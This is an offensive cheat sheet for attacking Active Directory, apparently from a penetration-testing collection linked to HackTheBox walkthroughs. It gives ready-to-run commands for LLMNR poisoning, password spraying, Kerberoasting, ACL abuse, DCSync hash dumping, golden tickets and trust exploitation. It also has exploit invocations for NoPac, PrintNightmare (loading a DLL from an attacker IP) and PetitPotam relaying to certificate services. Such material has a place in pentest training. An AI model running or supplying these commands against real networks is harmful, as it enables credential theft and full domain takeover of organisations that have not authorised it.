# Active Directory Enumeration

Full kill-chain reference: initial recon → poisoning → password spraying → credentialed enumeration → Kerberos attacks → ACL abuse → domain dominance → trust exploitation.

> Placeholder convention: `<TARGET>` = domain controller/target IP, `<DOMAIN>` = domain name, `<USER>`/`<PASS>` = valid credentials once obtained.

---

## Initial Enumeration

| Command | Platform | Description |
|---|:---:|---|
| `nslookup ns1.<domain>` | Linux | DNS query to map IP ↔ domain name |
| `sudo tcpdump -i <iface>` | Linux | Start packet capture on an interface |
| `sudo responder -I <iface> -A` | Linux | Passive analysis mode — listen for LLMNR/NBT-NS/MDNS queries |
| `fping -asgq <CIDR>` | Linux | Ping sweep a network segment |
| `sudo nmap -v -A -iL hosts.txt -oN out` | Linux | Full nmap scan (OS/version/script/traceroute) against a host list |
| `git clone https://github.com/ropnop/kerbrute.git` | Linux | Clone Kerbrute |
| `./kerbrute_linux_amd64 userenum -d <DOMAIN> --dc <TARGET> users.txt -o results` | Linux | Enumerate valid usernames via Kerberos pre-auth responses |

## LLMNR / NBT-NS Poisoning

| Command | Platform | Description |
|---|:---:|---|
| `responder -h` | Linux | Show Responder usage |
| `hashcat -m 5600 hash.txt rockyou.txt` | Linux | Crack captured NTLMv2 hashes |
| `Import-Module .\Inveigh.ps1` | Windows | Load Inveigh |
| `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y` | Windows | Start Inveigh with LLMNR+NBNS spoofing |
| `.\Inveigh.exe` | Windows | Run the C# Inveigh implementation |

**Disable NBT-NS defensively (PowerShell):**
```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose }
```

## Password Spraying & Password Policy

| Command | Platform | Description |
|---|:---:|---|
| `crackmapexec smb <TARGET> -u <USER> -p <PASS> --pass-pol` | Linux | Enumerate password policy with valid creds |
| `rpcclient -U "" -N <TARGET>` | Linux | Null session |
| `rpcclient $> querydominfo` | Linux | Enumerate domain password policy via null session |
| `enum4linux -P <TARGET>` | Linux | Password policy enumeration |
| `enum4linux-ng -P <TARGET> -oA out` | Linux | Same, with YAML/JSON output |
| `ldapsearch -h <TARGET> -x -b "DC=...,DC=..." -s sub "*" \| grep -B10 pwdHistoryLength` | Linux | Password policy via LDAP |
| `net accounts` | Windows | Password policy (domain-joined host) |
| `Get-DomainPolicy` (PowerView) | Windows | Password policy via PowerView |

**User discovery:**

| Command | Platform | Description |
|---|:---:|---|
| `enum4linux -U <TARGET> \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"` | Linux | Extract usernames |
| `rpcclient $> enumdomusers` | Linux | List domain users + RIDs |
| `crackmapexec smb <TARGET> --users` | Linux | User enumeration |
| `ldapsearch ... "(&(objectclass=user))" \| grep sAMAccountName:` | Linux | LDAP user extraction |
| `./windapsearch.py --dc-ip <TARGET> -u "" -U` | Linux | Anonymous user enumeration |

**Spraying:**

| Command | Platform | Description |
|---|:---:|---|
| `for u in $(cat users.txt); do rpcclient -U "$u%<PASS>" -c "getusername;quit" <TARGET> \| grep Authority; done` | Linux | Manual spray via rpcclient |
| `kerbrute passwordspray -d <DOMAIN> --dc <TARGET> users.txt <PASS>` | Linux | Kerbrute spray |
| `sudo crackmapexec smb <TARGET> -u users.txt -p <PASS> \| grep +` | Linux | CME spray, filtered to successes |
| `sudo crackmapexec smb --local-auth <CIDR> -u administrator -H <NTHASH> \| grep +` | Linux | Local-auth spray with a hash — avoids domain lockout policy |
| `Import-Module .\DomainPasswordSpray.ps1; Invoke-DomainPasswordSpray -Password <PASS> -OutFile out` | Windows | PowerShell spray tool |

## Enumerating Security Controls

| Command | Platform | Description |
|---|:---:|---|
| `Get-MpComputerStatus` | Windows | Windows Defender status |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections` | Windows | AppLocker rules |
| `$ExecutionContext.SessionState.LanguageMode` | Windows | PowerShell language mode |
| `Find-LAPSDelegatedGroups` / `Find-AdmPwdExtendedRights` / `Get-LAPSComputers` | Windows | LAPSToolkit — find LAPS-enabled hosts and who can read passwords |

## Credentialed Enumeration

| Command | Platform | Description |
|---|:---:|---|
| `xfreerdp /u:<USER>@<DOMAIN> /p:<PASS> /v:<TARGET>` | Linux | RDP with valid creds |
| `crackmapexec smb <TARGET> -u <USER> -p <PASS> --shares` / `--groups` / `--loggedon-users` | Linux | Enumerate shares/groups/sessions |
| `crackmapexec smb <TARGET> -u <USER> -p <PASS> -M spider_plus --share <SHARE>` | Linux | Recursively list readable files in a share |
| `smbmap -u <USER> -p <PASS> -d <DOMAIN> -H <TARGET>` | Linux | Share/permission enumeration |
| `psexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET>` | Linux | Impacket — shell via ADMIN$ |
| `wmiexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET>` | Linux | Impacket — shell via WMI |
| `sudo bloodhound-python -u <USER> -p <PASS> -ns <TARGET> -d <DOMAIN> -c all` | Linux | Collect BloodHound data |

## Living Off the Land (native AD module / PowerView)

| Command | Description |
|---|---|
| `Import-Module ActiveDirectory; Get-ADDomain` | Basic domain info |
| `Get-ADUser -Filter {ServicePrincipalName -ne "$null"}` | Find SPN-bearing accounts |
| `Get-ADTrust -Filter *` | Trust relationships |
| `Get-ADGroupMember -Identity "Backup Operators"` | Group membership |
| `Get-DomainUser` / `Get-DomainComputer` / `Get-DomainGroup` / `Get-DomainOU` (PowerView) | Core object enumeration |
| `Find-InterestingDomainAcl` | Non-default ACL grants |
| `Get-DomainGroupMember -Identity "Domain Admins" -Recurse` | Full recursive DA membership |
| `Get-DomainTrust` / `Get-ForestTrust` / `Get-DomainTrustMapping` | Trust mapping |
| `Find-DomainShare` / `Find-InterestingDomainShareFile` | Share discovery + content search |
| `Find-LocalAdminAccess` | Where does the current user have local admin? |
| `.\Snaffler.exe -d <DOMAIN> -s -v data` | Automated sensitive-data discovery across shares |

## Kerberoasting

| Command | Platform | Description |
|---|:---:|---|
| `GetUserSPNs.py -dc-ip <TARGET> <DOMAIN>/<USER>` | Linux | List SPNs |
| `GetUserSPNs.py -dc-ip <TARGET> <DOMAIN>/<USER> -request` | Linux | Request all TGS tickets |
| `GetUserSPNs.py ... -request-user <TARGET_USER> -outputfile out` | Linux | Target a specific account, write to file |
| `hashcat -m 13100 tgs.hash rockyou.txt --force` | Linux | Crack TGS hash |
| `setspn.exe -Q */*` | Windows | Enumerate SPNs natively |
| `.\Rubeus.exe kerberoast /stats` | Windows | Kerberoast stats |
| `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap` | Windows | Roast admin-count accounts, hashcat-ready output |
| `.\Rubeus.exe kerberoast /user:<TARGET_USER> /nowrap` | Windows | Roast one account |
| `Get-DomainUser -Identity <USER> \| Get-DomainSPNTicket -Format Hashcat` | Windows | PowerView roast |

## ACL Enumeration & Abuse

| Command | Description |
|---|---|
| `Find-InterestingDomainAcl` | Find non-default ACL grants |
| `$sid = Convert-NameToSid <USER>; Get-DomainObjectACL -Identity * \| ? {$_.SecurityIdentifier -eq $sid}` | Find everything a user has rights over |
| `Get-DomainObjectACL -ResolveGUIDs -Identity * \| ? {...}` | Same, with GUID rights resolved to names |
| `Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $pw -Credential $Cred` | Abuse `ForceChangePassword`/`GenericAll` to reset a password |
| `Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>' -Credential $Cred` | Abuse `GenericWrite`/`WriteDacl` on a group |
| `Set-DomainObject -Credential $Cred -Identity <USER> -SET @{serviceprincipalname='fake/SPN'}` | Force a fake SPN onto a targeted-Kerberoastable account |

## DCSync

| Command | Platform | Description |
|---|:---:|---|
| `Get-ObjectAcl "DC=...,DC=..." -ResolveGUIDs \| ? {$_.ObjectAceType -match 'Replication-Get'}` | Windows | Check for DCSync-capable replication rights |
| `secretsdump.py -outputfile out -just-dc <DOMAIN>/<USER>@<TARGET> -use-vss` | Linux | Impacket DCSync — dump NTDS.dit hashes |
| `mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\administrator` | Windows | Mimikatz DCSync |

## Privileged Access — Lateral Movement

| Command | Platform | Description |
|---|:---:|---|
| `Enter-PSSession -ComputerName <HOST> -Credential $cred` | Windows | Remote PS session |
| `evil-winrm -i <TARGET> -u <USER>` | Linux | WinRM shell |
| `Import-Module .\PowerUpSQL.ps1; Get-SQLInstanceDomain` | Windows | Find SQL instances domain-wide |
| `mssqlclient.py <DOMAIN>/<USER>@<TARGET> -windows-auth` | Linux | Impacket MSSQL client |
| `SQL> enable_xp_cmdshell; xp_cmdshell whoami /priv` | — | Enable and use OS command exec via SQL |

## NoPac / Sam-the-Admin

```bash
sudo git clone https://github.com/Ridter/noPac.git
sudo python3 scanner.py <DOMAIN>/<USER>:<PASS> -dc-ip <TARGET> -use-ldap
sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <TARGET> -dc-host <DC_HOSTNAME> -shell --impersonate administrator -use-ldap
```

## PrintNightmare (CVE-2021-1675)

```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
rpcdump.py @<TARGET> | egrep 'MS-RPRN|MS-PAR'   # check exposure
sudo python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASS>@<TARGET> '\\<ATTACKER_IP>\share\payload.dll'
```

## PetitPotam → ADCS Relay

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://<CA_HOST>/certsrv/certfnsh.asp --adcs --template DomainController
git clone https://github.com/topotam/PetitPotam.git
python3 PetitPotam.py <ATTACKER_IP> <TARGET>
```

## Group Policy Enumeration & Attacks

| Command | Description |
|---|---|
| `gpp-decrypt <encrypted_blob>` | Decrypt a captured GPP password |
| `crackmapexec smb <TARGET> -u <USER> -p <PASS> -M gpp_autologin` | Find creds stored in SYSVOL |
| `Get-DomainGPO \| select displayname` | List GPOs |
| `Get-DomainGPO \| Get-ObjectAcl \| ? {$_.SecurityIdentifier -eq $sid}` | Check who can modify a GPO |

## ASREPRoasting

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname
.\Rubeus.exe asreproast /user:<USER> /nowrap /format:hashcat
```
```bash
hashcat -m 18200 asrep.hash rockyou.txt
kerbrute userenum -d <DOMAIN> --dc <TARGET> users.txt   # auto-grabs AS-REPs for pre-auth-disabled users
```

## Trust Relationships — Child → Parent

```powershell
Get-ADTrust -Filter *
Get-DomainTrust
Get-DomainUser -Domain <CHILD_DOMAIN> | select SamAccountName
mimikatz # lsadump::dcsync /user:<CHILD_DOMAIN>\krbtgt
mimikatz # kerberos::golden /user:hacker /domain:<CHILD_DOMAIN> /sid:<CHILD_SID> /krbtgt:<KRBTGT_HASH> /sids:<PARENT_ENTERPRISE_ADMINS_SID> /ptt
```

```bash
secretsdump.py <CHILD_DOMAIN>/<USER>@<TARGET> -just-dc-user <CHILD>/krbtgt
ticketer.py -nthash <KRBTGT_HASH> -domain <CHILD_DOMAIN> -domain-sid <CHILD_SID> -extra-sid <PARENT_EA_SID> hacker
export KRB5CCNAME=hacker.ccache
psexec.py <CHILD_DOMAIN>/hacker@<PARENT_DC> -k -no-pass -target-ip <PARENT_TARGET>
```

## Trust Relationships — Cross-Forest

```powershell
Get-DomainUser -SPN -Domain <OTHER_FOREST>
Get-DomainForeignGroupMember -Domain <OTHER_FOREST>
.\Rubeus.exe kerberoast /domain:<OTHER_FOREST> /user:<SVC_ACCOUNT> /nowrap
```
```bash
GetUserSPNs.py -request -target-domain <OTHER_FOREST> <HOME_DOMAIN>/<USER>
bloodhound-python -d <DOMAIN> -dc <DC_HOST> -c All -u <USER> -p <PASS>
```

---

<div align="center">

*Part of the [D4RKGUNN3R Cheatsheets](./README.md) collection. Full applied example: [Overwatch](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/overwatch.md)*

</div>
